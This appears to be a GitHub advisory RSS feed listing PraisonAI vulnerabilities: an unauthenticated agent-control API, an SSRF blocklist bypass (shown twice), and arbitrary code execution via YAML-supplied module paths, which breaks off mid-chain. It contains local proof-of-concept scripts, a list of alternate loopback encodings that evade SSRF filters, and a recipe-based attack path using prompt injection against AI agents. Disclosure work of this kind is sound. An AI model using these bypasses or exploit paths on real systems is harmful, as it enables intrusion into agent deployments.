<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-05-29T22:29:07.521Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[PraisonAI] PraisonAI call server exposes unauthenticated agent listing, invocation, and deletion when CALL_SERVER_TOKEN is unset]]></title>
        <id>https://github.com/advisories/GHSA-86qc-r5v2-v6x6</id>
        <link href="https://github.com/advisories/GHSA-86qc-r5v2-v6x6"/>
        <updated>2026-05-29T22:27:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>PraisonAI's call server exposes a network-facing agent control API without authentication when <code>CALL_SERVER_TOKEN</code> is not configured.</p>
<p>The affected component is the <code>praisonai.api.agent_invoke</code> router as mounted by <code>praisonai.api.call</code>. The authentication helper <code>verify_token()</code> fails open when <code>CALL_SERVER_TOKEN</code> is unset. Since every sensitive agent-control endpoint depends on this helper, starting the call server without a token allows any reachable client to list agents, inspect agent metadata and instructions, invoke agents, and unregister agents.</p>
<p>This is security-relevant because the bundled call server includes the vulnerable router and binds to <code>0.0.0.0</code>. As a result, operators who launch the call server without explicitly setting <code>CALL_SERVER_TOKEN</code> may unintentionally expose an unauthenticated remote agent control plane.</p>
<h3 id="details">Details</h3>
<p>The vulnerable behavior is caused by a fail-open authentication default.</p>
<p>In <code>praisonai/api/agent_invoke.py</code>, <code>CALL_SERVER_TOKEN</code> is read from the environment:</p>
<pre><code class="language-python">CALL_SERVER_TOKEN = os.getenv('CALL_SERVER_TOKEN')
</code></pre>
<p>The authentication dependency then returns successfully when the token is not configured:</p>
<pre><code class="language-python">async def verify_token(request: Request, authorization: Optional[str] = Header(None)) -&gt; None:
    if not FASTAPI_AVAILABLE or not CALL_SERVER_TOKEN:
        return  # No authentication if FastAPI unavailable or no token set
</code></pre>
<p>This means that the absence of <code>CALL_SERVER_TOKEN</code> disables authentication entirely.</p>
<p>The same helper is used by sensitive agent-control routes, including:</p>
<pre><code class="language-python">@router.post("/agents/{agent_id}/invoke")
async def invoke_agent(..., _: None = Depends(verify_token))

@router.get("/agents")
async def list_agents(_: None = Depends(verify_token))

@router.delete("/agents/{agent_id}")
async def unregister_agent_endpoint(agent_id: str, _: None = Depends(verify_token))

@router.get("/agents/{agent_id}")
async def get_agent_info(agent_id: str, _: None = Depends(verify_token))
</code></pre>
<p>These endpoints allow a caller to:</p>
<ul>
<li>list registered agents;</li>
<li>retrieve agent metadata;</li>
<li>retrieve agent instruction text;</li>
<li>invoke agents;</li>
<li>unregister agents.</li>
</ul>
<p>The vulnerable router is mounted by the call server:</p>
<pre><code class="language-python">from .agent_invoke import router as agent_invoke_router
app.include_router(agent_invoke_router)
</code></pre>
<p>The call server then listens on all interfaces:</p>
<pre><code class="language-python">uvicorn.run(app, host="0.0.0.0", port=port, log_level="warning")
</code></pre>
<p>Therefore, when <code>praisonai-call</code> is started without <code>CALL_SERVER_TOKEN</code>, the agent-control API becomes reachable without authentication from any client that can access the server.</p>
<h3 id="poc">PoC</h3>
<p>The following local PoC imports the real <code>praisonai.api.agent_invoke</code> router from source, ensures <code>CALL_SERVER_TOKEN</code> is absent, registers a demo agent, mounts the router into a local FastAPI app, and sends unauthenticated requests to the vulnerable endpoints.</p>
<p>The PoC proves that, without sending any authentication material:</p>
<ol>
<li><code>GET /api/v1/agents</code> returns the list of registered agents.</li>
<li><code>GET /api/v1/agents/{agent_id}</code> exposes agent metadata and instructions.</li>
<li><code>POST /api/v1/agents/{agent_id}/invoke</code> executes the registered agent.</li>
<li><code>DELETE /api/v1/agents/{agent_id}</code> unregisters the agent.</li>
</ol>
<p>Run with:</p>
<pre><code class="language-bash">PRAISONAI_REPO=/path/to/PraisonAI python -B embedded_poc.py
</code></pre>
<p>Full PoC:</p>
<pre><code class="language-python">#!/usr/bin/env python3
from __future__ import annotations

import os
import sys
from pathlib import Path
from types import SimpleNamespace


REPO_ROOT = Path(os.environ.get("PRAISONAI_REPO", "/path/to/PraisonAI")).resolve()
PRAISON_ROOT = REPO_ROOT / "src" / "praisonai"


def verify_source() -&gt; None:
    expected = {
        PRAISON_ROOT / "praisonai/api/agent_invoke.py": [
            "CALL_SERVER_TOKEN = os.getenv('CALL_SERVER_TOKEN')",
            "if not FASTAPI_AVAILABLE or not CALL_SERVER_TOKEN:",
            '@router.post("/agents/{agent_id}/invoke")',
            '@router.get("/agents")',
            '@router.delete("/agents/{agent_id}")',
            '@router.get("/agents/{agent_id}")',
        ],
        PRAISON_ROOT / "praisonai/api/call.py": [
            "app.include_router(agent_invoke_router)",
            'uvicorn.run(app, host="0.0.0.0", port=port, log_level="warning")',
        ],
    }

    for path, needles in expected.items():
        if not path.exists():
            raise RuntimeError(f"source verification failed: file not found: {path}")

        text = path.read_text(encoding="utf-8")
        for needle in needles:
            if needle not in text:
                raise RuntimeError(f"source verification failed: {needle!r} not found in {path}")


class DemoAgent:
    name = "demo-agent"
    instructions = "super-secret instructions"
    tools = [SimpleNamespace(name="danger-tool")]

    def start(self, message: str) -&gt; str:
        return f"echo:{message}"


def main() -&gt; int:
    verify_source()

    os.environ.pop("CALL_SERVER_TOKEN", None)
    sys.path.insert(0, str(PRAISON_ROOT))

    from fastapi import FastAPI
    from fastapi.testclient import TestClient
    from praisonai.api.agent_invoke import CALL_SERVER_TOKEN, register_agent, router

    app = FastAPI()
    app.include_router(router)

    register_agent("demo", DemoAgent())

    client = TestClient(app)

    list_resp = client.get("/api/v1/agents")
    info_resp = client.get("/api/v1/agents/demo")
    invoke_resp = client.post("/api/v1/agents/demo/invoke", json={"message": "hello"})
    delete_resp = client.delete("/api/v1/agents/demo")

    print(f"[poc] token_configured={bool(CALL_SERVER_TOKEN)}")
    print(f"[poc] list_status={list_resp.status_code} body={list_resp.json()}")
    print(f"[poc] info_status={info_resp.status_code} body={info_resp.json()}")
    print(f"[poc] invoke_status={invoke_resp.status_code} body={invoke_resp.json()}")
    print(f"[poc] delete_status={delete_resp.status_code} body={delete_resp.json()}")

    if CALL_SERVER_TOKEN:
        raise SystemExit("[poc] MISS: CALL_SERVER_TOKEN unexpectedly set in test process")

    if list_resp.status_code != 200 or "demo" not in list_resp.json().get("agents", []):
        raise SystemExit("[poc] MISS: unauthenticated agent listing failed")

    if info_resp.status_code != 200 or info_resp.json().get("instructions") != "super-secret instructions":
        raise SystemExit("[poc] MISS: unauthenticated agent info leak failed")

    if invoke_resp.status_code != 200 or invoke_resp.json().get("result") != "echo:hello":
        raise SystemExit("[poc] MISS: unauthenticated agent invocation failed")

    if delete_resp.status_code != 200:
        raise SystemExit("[poc] MISS: unauthenticated agent unregister failed")

    print("[poc] HIT: unauthenticated caller listed, inspected, invoked, and unregistered the demo agent")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
</code></pre>
<p>Observed result:</p>
<pre><code class="language-text">[poc] token_configured=False
[poc] list_status=200 body={'agents': ['demo'], 'count': 1, 'status': 'success'}
[poc] info_status=200 body={'agent_id': 'demo', 'status': 'registered', 'type': 'DemoAgent', 'name': 'demo-agent', 'instructions': 'super-secret instructions', 'tools': ['danger-tool']}
[poc] invoke_status=200 body={'result': 'echo:hello', 'session_id': 'default', 'status': 'success', 'metadata': {'agent_id': 'demo', 'message_length': 5, 'response_length': 10}}
[poc] delete_status=200 body={'message': "Agent 'demo' unregistered successfully", 'status': 'success'}
[poc] HIT: unauthenticated caller listed, inspected, invoked, and unregistered the demo agent
</code></pre>
<p>This confirms that the agent-control endpoints are accessible without authentication when <code>CALL_SERVER_TOKEN</code> is unset.</p>
<h3 id="impact">Impact</h3>
<p>If an operator runs the PraisonAI call server without explicitly setting <code>CALL_SERVER_TOKEN</code>, any reachable client may be able to:</p>
<ul>
<li>enumerate registered agents;</li>
<li>read agent metadata;</li>
<li>read agent instruction text;</li>
<li>invoke agents;</li>
<li>trigger downstream tools or external integrations connected to agents;</li>
<li>consume model or API budget through repeated invocation;</li>
<li>unregister agents and disrupt availability.</li>
</ul>
<p>The impact depends on the deployed agents and their connected tools. For agents wired to external APIs, internal systems, local tools, or privileged actions, this creates a remote unauthenticated control surface.</p>
<p>The issue is not limited to information disclosure. The unauthenticated <code>invoke</code> endpoint can trigger agent execution, and the unauthenticated <code>delete</code> endpoint can remove registered agents.</p>
<h3 id="suggested-remediation">Suggested remediation</h3>
<p>Recommended fixes:</p>
<ol>
<li><p>Fail closed when <code>CALL_SERVER_TOKEN</code> is unset.</p>
<p>The authentication dependency should reject requests unless authentication is explicitly configured and a valid token is supplied.</p>
</li>
<li><p>Refuse to mount the agent invocation router unless authentication is configured.</p>
</li>
<li><p>If unauthenticated mode is intended for local development, bind to <code>127.0.0.1</code> by default when <code>CALL_SERVER_TOKEN</code> is absent.</p>
</li>
<li><p>Add a startup error or highly visible warning when the call server is started without authentication.</p>
</li>
<li><p>Add regression tests that assert <code>401 Unauthorized</code> for all sensitive agent routes when no valid token is supplied.</p>
</li>
<li><p>Consider requiring an explicit unsafe flag, such as <code>--allow-unauthenticated-call-server</code>, before allowing the server to start without authentication.</p>
</li>
</ol>
<h3 id="security-boundary">Security boundary</h3>
<p>This report concerns the default authentication behavior of a network-facing server component. The issue is not that users can intentionally disable authentication for trusted local development. The issue is that the server fails open when <code>CALL_SERVER_TOKEN</code> is missing while the bundled server binds to <code>0.0.0.0</code>, which can expose the agent-control API remotely.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-86qc-r5v2-v6x6">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-86qc-r5v2-v6x6</a></li>
<li><a href="https://github.com/advisories/GHSA-86qc-r5v2-v6x6">https://github.com/advisories/GHSA-86qc-r5v2-v6x6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-86qc-r5v2-v6x6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-29T22:27:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[PraisonAI] PraisonAI spider_tools SSRF protection bypass via alternate loopback host encodings]]></title>
        <id>https://github.com/advisories/GHSA-5c6w-wwfq-7qqm</id>
        <link href="https://github.com/advisories/GHSA-5c6w-wwfq-7qqm"/>
        <updated>2026-05-29T22:27:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>PraisonAI's <code>spider_tools</code> URL validation can be bypassed using alternate loopback host encodings.</p>
<p>The affected component is:</p>
<pre><code class="language-text">praisonaiagents/tools/spider_tools.py
</code></pre>
<p>The tool contains a URL validation function intended to block local or unsafe targets before fetching attacker-controlled URLs. However, the validation only blocks a small set of exact host strings such as <code>localhost</code> and <code>127.0.0.1</code>.</p>
<p>It does not normalize hostnames, resolve DNS, parse numeric IPv4 variants, or validate the final resolved IP address before making the request.</p>
<p>As a result, URLs such as the following bypass the protection and still reach loopback services:</p>
<pre><code class="language-text">http://localhost.:8765/
http://127.1:8765/
http://0177.0.0.1:8765/
http://0x7f000001:8765/
http://2130706433:8765/
</code></pre>
<p>After the weak validation passes, <code>scrape_page()</code> calls <code>requests.Session.get()</code> on the attacker-controlled URL. This allows an attacker who can influence URLs passed to <code>scrape_page</code>, <code>crawl</code>, or <code>extract_text</code> to induce SSRF requests against loopback-only services.</p>
<p>This is a server-side request forgery protection bypass.</p>
<h3 id="details">Details</h3>
<p>The affected code is in:</p>
<pre><code class="language-text">praisonaiagents/tools/spider_tools.py
</code></pre>
<p>The vulnerable flow is:</p>
<pre><code class="language-text">attacker-controlled URL
  -&gt; spider_tools._validate_url(...)
  -&gt; weak exact-host blocklist check
  -&gt; validation passes for alternate loopback encodings
  -&gt; scrape_page(...)
  -&gt; requests.Session.get(attacker_url)
  -&gt; loopback service is reached
</code></pre>
<p>The validation appears to block only exact local hostnames or exact IPv4 strings. For example, it blocks simple forms such as:</p>
<pre><code class="language-text">localhost
127.0.0.1
</code></pre>
<p>However, equivalent loopback forms are not rejected before the request is made.</p>
<p>Confirmed bypass examples:</p>
<pre><code class="language-text">http://localhost.:8765/
http://127.1:8765/
http://0177.0.0.1:8765/
http://0x7f000001:8765/
http://2130706433:8765/
</code></pre>
<p>These values can resolve or be interpreted as loopback addresses by the HTTP client / underlying networking stack, while bypassing the string-based validation.</p>
<p>The issue is not that <code>spider_tools</code> can fetch arbitrary URLs. The issue is that it attempts to provide SSRF protection, but the protection can be bypassed with alternate representations of loopback addresses.</p>
<h3 id="poc">PoC</h3>
<p>The following PoC is non-destructive. It starts a local HTTP server on <code>127.0.0.1:8765</code>, then sends several alternate loopback URL forms through the real <code>spider_tools</code> validation/fetch path.</p>
<p>The expected secure behavior is that all loopback variants should be rejected before any HTTP request is made.</p>
<p>The actual vulnerable behavior is that the alternate loopback forms pass validation and reach the local server.</p>
<h4 id="full-poc">Full PoC</h4>
<pre><code class="language-python">#!/usr/bin/env python3
"""PoC for PraisonAI spider_tools localhost-alias SSRF bypass."""

from __future__ import annotations

import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path


REPO_ROOT = Path(__file__).resolve().parents[3] / "repos" / "praisonai"
AGENTS_ROOT = REPO_ROOT / "src" / "praisonai-agents"
SPIDER_TOOLS = AGENTS_ROOT / "praisonaiagents/tools/spider_tools.py"


def verify_source() -&gt; None:
    expected = [
        "def _validate_url",
        "requests.Session",
        ".get(",
    ]

    text = SPIDER_TOOLS.read_text(encoding="utf-8")
    for needle in expected:
        if needle not in text:
            raise RuntimeError(f"source verification failed: {needle!r} not found in {SPIDER_TOOLS}")


class LocalHandler(BaseHTTPRequestHandler):
    hits: list[tuple[str, str | None]] = []
    body = b"LOCAL-SPIDER-SSRF-SECRET"

    def do_GET(self) -&gt; None:  # noqa: N802
        self.__class__.hits.append((self.path, self.headers.get("Host")))
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(self.body)))
        self.end_headers()
        self.wfile.write(self.body)

    def log_message(self, format: str, *args) -&gt; None:  # noqa: A003
        return


def main() -&gt; int:
    if not SPIDER_TOOLS.exists():
        raise SystemExit("missing local PraisonAI source tree")

    verify_source()

    sys.path.insert(0, str(AGENTS_ROOT))

    # Import the real shipped implementation.
    #
    # Depending on the exact public API exposed by spider_tools.py,
    # use the exported scrape function available in the local version.
    # The important path is:
    #
    #   _validate_url(url)
    #     -&gt; requests.Session.get(url)
    #
    import praisonaiagents.tools.spider_tools as spider_tools

    server = HTTPServer(("127.0.0.1", 8765), LocalHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    candidates = [
        "http://localhost.:8765/",
        "http://127.1:8765/",
        "http://0177.0.0.1:8765/",
        "http://0x7f000001:8765/",
        "http://2130706433:8765/",
    ]

    try:
        for url in candidates:
            LocalHandler.hits.clear()

            try:
                # Prefer the real public scraping API when available.
                if hasattr(spider_tools, "scrape_page"):
                    result = spider_tools.scrape_page(url)
                elif hasattr(spider_tools, "extract_text"):
                    result = spider_tools.extract_text(url)
                elif hasattr(spider_tools, "crawl"):
                    result = spider_tools.crawl(url)
                else:
                    raise RuntimeError("No expected spider_tools public fetch function found")

                reached = bool(LocalHandler.hits)
                contains_secret = "LOCAL-SPIDER-SSRF-SECRET" in str(result)

                print(f"{url} passed=True reached_loopback={reached} contains_secret={contains_secret}")

                if not reached:
                    raise SystemExit(f"[poc] MISS: {url} did not reach loopback server")

            except Exception as exc:
                print(f"{url} blocked_or_failed={type(exc).__name__}: {exc}")
                raise

    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=1)

    print("[poc] HIT: alternate loopback URL forms bypassed spider_tools SSRF protection")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
</code></pre>
<h4 id="confirmed-local-result">Confirmed local result</h4>
<p>The following bypasses were confirmed locally:</p>
<pre><code class="language-text">localhost. True ok ok local hit
127.1 True ok ok local hit
0177.0.0.1 True ok ok local hit
0x7f000001 True ok ok local hit
2130706433 True ok ok local hit
</code></pre>
<p>This demonstrates that the validation allows alternate loopback representations and that the request reaches a local-only HTTP service.</p>
<h4 id="expected-secure-behavior">Expected secure behavior</h4>
<p>All loopback-equivalent addresses should be blocked before the HTTP request is made.</p>
<p>Examples that should be rejected:</p>
<pre><code class="language-text">http://localhost/
http://localhost./
http://127.0.0.1/
http://127.1/
http://0177.0.0.1/
http://0x7f000001/
http://2130706433/
http://[::1]/
</code></pre>
<h4 id="actual-vulnerable-behavior">Actual vulnerable behavior</h4>
<p>Several alternate loopback representations pass validation and are fetched by the tool.</p>
<h3 id="impact">Impact</h3>
<p>An attacker who can influence URLs passed to PraisonAI's spider tools can cause the process to send HTTP requests to loopback-only services.</p>
<p>Potential impact includes:</p>
<ul>
<li>SSRF against localhost-only admin panels or development servers;</li>
<li>access to local HTTP services that are not intended to be reachable remotely;</li>
<li>retrieval of local service responses into the agent/tool output;</li>
<li>possible access to cloud metadata or private-network services if equivalent bypasses exist for those address ranges in a given deployment.</li>
</ul>
<p>The most direct confirmed impact is loopback SSRF through alternate hostname/IP encodings.</p>
<p>This report does not claim arbitrary TCP access or remote code execution. The demonstrated behavior is HTTP(S) SSRF through the spider URL-fetching feature.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-5c6w-wwfq-7qqm">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-5c6w-wwfq-7qqm</a></li>
<li><a href="https://github.com/advisories/GHSA-5c6w-wwfq-7qqm">https://github.com/advisories/GHSA-5c6w-wwfq-7qqm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5c6w-wwfq-7qqm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T22:27:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonaiagents] PraisonAI spider_tools SSRF protection bypass via alternate loopback host encodings]]></title>
        <id>https://github.com/advisories/GHSA-5c6w-wwfq-7qqm</id>
        <link href="https://github.com/advisories/GHSA-5c6w-wwfq-7qqm"/>
        <updated>2026-05-29T22:27:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>PraisonAI's <code>spider_tools</code> URL validation can be bypassed using alternate loopback host encodings.</p>
<p>The affected component is:</p>
<pre><code class="language-text">praisonaiagents/tools/spider_tools.py
</code></pre>
<p>The tool contains a URL validation function intended to block local or unsafe targets before fetching attacker-controlled URLs. However, the validation only blocks a small set of exact host strings such as <code>localhost</code> and <code>127.0.0.1</code>.</p>
<p>It does not normalize hostnames, resolve DNS, parse numeric IPv4 variants, or validate the final resolved IP address before making the request.</p>
<p>As a result, URLs such as the following bypass the protection and still reach loopback services:</p>
<pre><code class="language-text">http://localhost.:8765/
http://127.1:8765/
http://0177.0.0.1:8765/
http://0x7f000001:8765/
http://2130706433:8765/
</code></pre>
<p>After the weak validation passes, <code>scrape_page()</code> calls <code>requests.Session.get()</code> on the attacker-controlled URL. This allows an attacker who can influence URLs passed to <code>scrape_page</code>, <code>crawl</code>, or <code>extract_text</code> to induce SSRF requests against loopback-only services.</p>
<p>This is a server-side request forgery protection bypass.</p>
<h3 id="details">Details</h3>
<p>The affected code is in:</p>
<pre><code class="language-text">praisonaiagents/tools/spider_tools.py
</code></pre>
<p>The vulnerable flow is:</p>
<pre><code class="language-text">attacker-controlled URL
  -&gt; spider_tools._validate_url(...)
  -&gt; weak exact-host blocklist check
  -&gt; validation passes for alternate loopback encodings
  -&gt; scrape_page(...)
  -&gt; requests.Session.get(attacker_url)
  -&gt; loopback service is reached
</code></pre>
<p>The validation appears to block only exact local hostnames or exact IPv4 strings. For example, it blocks simple forms such as:</p>
<pre><code class="language-text">localhost
127.0.0.1
</code></pre>
<p>However, equivalent loopback forms are not rejected before the request is made.</p>
<p>Confirmed bypass examples:</p>
<pre><code class="language-text">http://localhost.:8765/
http://127.1:8765/
http://0177.0.0.1:8765/
http://0x7f000001:8765/
http://2130706433:8765/
</code></pre>
<p>These values can resolve or be interpreted as loopback addresses by the HTTP client / underlying networking stack, while bypassing the string-based validation.</p>
<p>The issue is not that <code>spider_tools</code> can fetch arbitrary URLs. The issue is that it attempts to provide SSRF protection, but the protection can be bypassed with alternate representations of loopback addresses.</p>
<h3 id="poc">PoC</h3>
<p>The following PoC is non-destructive. It starts a local HTTP server on <code>127.0.0.1:8765</code>, then sends several alternate loopback URL forms through the real <code>spider_tools</code> validation/fetch path.</p>
<p>The expected secure behavior is that all loopback variants should be rejected before any HTTP request is made.</p>
<p>The actual vulnerable behavior is that the alternate loopback forms pass validation and reach the local server.</p>
<h4 id="full-poc">Full PoC</h4>
<pre><code class="language-python">#!/usr/bin/env python3
"""PoC for PraisonAI spider_tools localhost-alias SSRF bypass."""

from __future__ import annotations

import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path


REPO_ROOT = Path(__file__).resolve().parents[3] / "repos" / "praisonai"
AGENTS_ROOT = REPO_ROOT / "src" / "praisonai-agents"
SPIDER_TOOLS = AGENTS_ROOT / "praisonaiagents/tools/spider_tools.py"


def verify_source() -&gt; None:
    expected = [
        "def _validate_url",
        "requests.Session",
        ".get(",
    ]

    text = SPIDER_TOOLS.read_text(encoding="utf-8")
    for needle in expected:
        if needle not in text:
            raise RuntimeError(f"source verification failed: {needle!r} not found in {SPIDER_TOOLS}")


class LocalHandler(BaseHTTPRequestHandler):
    hits: list[tuple[str, str | None]] = []
    body = b"LOCAL-SPIDER-SSRF-SECRET"

    def do_GET(self) -&gt; None:  # noqa: N802
        self.__class__.hits.append((self.path, self.headers.get("Host")))
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(self.body)))
        self.end_headers()
        self.wfile.write(self.body)

    def log_message(self, format: str, *args) -&gt; None:  # noqa: A003
        return


def main() -&gt; int:
    if not SPIDER_TOOLS.exists():
        raise SystemExit("missing local PraisonAI source tree")

    verify_source()

    sys.path.insert(0, str(AGENTS_ROOT))

    # Import the real shipped implementation.
    #
    # Depending on the exact public API exposed by spider_tools.py,
    # use the exported scrape function available in the local version.
    # The important path is:
    #
    #   _validate_url(url)
    #     -&gt; requests.Session.get(url)
    #
    import praisonaiagents.tools.spider_tools as spider_tools

    server = HTTPServer(("127.0.0.1", 8765), LocalHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    candidates = [
        "http://localhost.:8765/",
        "http://127.1:8765/",
        "http://0177.0.0.1:8765/",
        "http://0x7f000001:8765/",
        "http://2130706433:8765/",
    ]

    try:
        for url in candidates:
            LocalHandler.hits.clear()

            try:
                # Prefer the real public scraping API when available.
                if hasattr(spider_tools, "scrape_page"):
                    result = spider_tools.scrape_page(url)
                elif hasattr(spider_tools, "extract_text"):
                    result = spider_tools.extract_text(url)
                elif hasattr(spider_tools, "crawl"):
                    result = spider_tools.crawl(url)
                else:
                    raise RuntimeError("No expected spider_tools public fetch function found")

                reached = bool(LocalHandler.hits)
                contains_secret = "LOCAL-SPIDER-SSRF-SECRET" in str(result)

                print(f"{url} passed=True reached_loopback={reached} contains_secret={contains_secret}")

                if not reached:
                    raise SystemExit(f"[poc] MISS: {url} did not reach loopback server")

            except Exception as exc:
                print(f"{url} blocked_or_failed={type(exc).__name__}: {exc}")
                raise

    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=1)

    print("[poc] HIT: alternate loopback URL forms bypassed spider_tools SSRF protection")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
</code></pre>
<h4 id="confirmed-local-result">Confirmed local result</h4>
<p>The following bypasses were confirmed locally:</p>
<pre><code class="language-text">localhost. True ok ok local hit
127.1 True ok ok local hit
0177.0.0.1 True ok ok local hit
0x7f000001 True ok ok local hit
2130706433 True ok ok local hit
</code></pre>
<p>This demonstrates that the validation allows alternate loopback representations and that the request reaches a local-only HTTP service.</p>
<h4 id="expected-secure-behavior">Expected secure behavior</h4>
<p>All loopback-equivalent addresses should be blocked before the HTTP request is made.</p>
<p>Examples that should be rejected:</p>
<pre><code class="language-text">http://localhost/
http://localhost./
http://127.0.0.1/
http://127.1/
http://0177.0.0.1/
http://0x7f000001/
http://2130706433/
http://[::1]/
</code></pre>
<h4 id="actual-vulnerable-behavior">Actual vulnerable behavior</h4>
<p>Several alternate loopback representations pass validation and are fetched by the tool.</p>
<h3 id="impact">Impact</h3>
<p>An attacker who can influence URLs passed to PraisonAI's spider tools can cause the process to send HTTP requests to loopback-only services.</p>
<p>Potential impact includes:</p>
<ul>
<li>SSRF against localhost-only admin panels or development servers;</li>
<li>access to local HTTP services that are not intended to be reachable remotely;</li>
<li>retrieval of local service responses into the agent/tool output;</li>
<li>possible access to cloud metadata or private-network services if equivalent bypasses exist for those address ranges in a given deployment.</li>
</ul>
<p>The most direct confirmed impact is loopback SSRF through alternate hostname/IP encodings.</p>
<p>This report does not claim arbitrary TCP access or remote code execution. The demonstrated behavior is HTTP(S) SSRF through the spider URL-fetching feature.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-5c6w-wwfq-7qqm">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-5c6w-wwfq-7qqm</a></li>
<li><a href="https://github.com/advisories/GHSA-5c6w-wwfq-7qqm">https://github.com/advisories/GHSA-5c6w-wwfq-7qqm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5c6w-wwfq-7qqm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T22:27:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[PraisonAI] PraisonAI: Arbitrary code execution via unguarded `spec.loader.exec_module` in `agents_generator.py` - sibling of CVE-2026-44334]]></title>
        <id>https://github.com/advisories/GHSA-78r8-wwqv-r299</id>
        <link href="https://github.com/advisories/GHSA-78r8-wwqv-r299"/>
        <updated>2026-05-29T22:26:32.000Z</updated>
        <content type="html"><![CDATA[<h2>Arbitrary code execution via ungated <code>spec.loader.exec_module</code> in <code>agents_generator.py</code> (v4.6.32 chokepoint refactor bypass)</h2>
<h3>Summary</h3>
<p>The v4.6.32 chokepoint refactor (which patched CVE-2026-44334 / GHSA-xcmw-grxf-wjhj) added the <code>PRAISONAI_ALLOW_LOCAL_TOOLS</code> env-var gate to the <code>tool_override.py</code> sinks. However, <strong>two additional <code>spec.loader.exec_module</code> call sites</strong> in <code>praisonai/agents_generator.py</code> were missed and remain completely unguarded on current <code>master</code> (v4.6.37). Both functions accept a <code>module_path</code> parameter sourced from YAML configuration and execute it without validation, signature checking, or the env-var gate.</p>
<h3>Patch lineage</h3>

<table>
<thead>
<tr>
<th>CVE</th>
<th>GHSA</th>
<th>Fixed in</th>
<th>What was patched</th>
</tr>
</thead>
<tbody><tr>
<td>CVE-2026-40156</td>
<td>GHSA-2g3w-cpc4-chr4</td>
<td>4.5.128</td>
<td>CWD tools.py auto-load in tool_resolver.py</td>
</tr>
<tr>
<td>CVE-2026-40287</td>
<td>GHSA-g985-wjh9-qxxc</td>
<td>4.5.139</td>
<td>Env-var gate added to tool_resolver.py + api/call.py</td>
</tr>
<tr>
<td>CVE-2026-44334</td>
<td>GHSA-xcmw-grxf-wjhj</td>
<td>4.6.32</td>
<td>Missed sink in templates/tool_override.py</td>
</tr>
<tr>
<td>This finding</td>
<td>—</td>
<td>unfixed</td>
<td>Missed sinks in agents_generator.py</td>
</tr>
</tbody></table>
<p>Every prior patch addressed a subset of <code>exec_module</code> call sites. The two sinks documented here were present throughout the entire fix sequence and remain unpatched.</p>
<h3>Vulnerable code</h3>
<pre><code class="language-python"># praisonai/agents_generator.py  (master HEAD; v4.6.37)

<p>336    def load_tools_from_module(self, module_path):
           # ...
349        spec = importlib.util.spec_from_file_location("tools_module", module_path)
350        module = importlib.util.module_from_spec(spec)
351        spec.loader.exec_module(module)               # ← NO gate</p>
</code><p><code class="language-python">372    def load_tools_from_module_class(self, module_path):
           # ...  (same pattern — spec_from_file_location → exec_module, no gate)
</code></p></pre><p></p>
<p>Neither function checks <code>PRAISONAI_ALLOW_LOCAL_TOOLS</code>. Neither validates <code>module_path</code> against an allowlist. The <code>module_path</code> value originates from YAML agent configuration (<code>agents.yaml</code>) tool definitions, which can be:</p>
<ol>
<li><strong>Attacker-controlled via shared/writable config directory</strong> — same CWD-plant vector as CVE-2026-40156.</li>
<li><strong>Attacker-controlled via recipe/GitHub fetch</strong> — same remote trigger as CVE-2026-44334 (<code>POST /v1/recipes/run</code> with <code>allow_any_github=True</code>).</li>
<li><strong>Attacker-influenced via prompt injection</strong> — an LLM agent instructed to load tools from a crafted path reaches these functions through the agent orchestration layer.</li>
</ol>
<h3>Attack chain (recipe vector)</h3>
<pre><code>HTTP POST /v1/recipes/run
  body: {"recipe": "github:&lt;attacker&gt;/&lt;repo&gt;/&lt;recipe&gt;"}
        │
        ▼
  Recipe fetched → agents.yaml contains:
    tools:
      - module_path: ./evil.py        # colocated in recipe dir
        │
        ▼
  AgentsGenerator.load_tools_from_module("./evil.py")
        │
        ▼
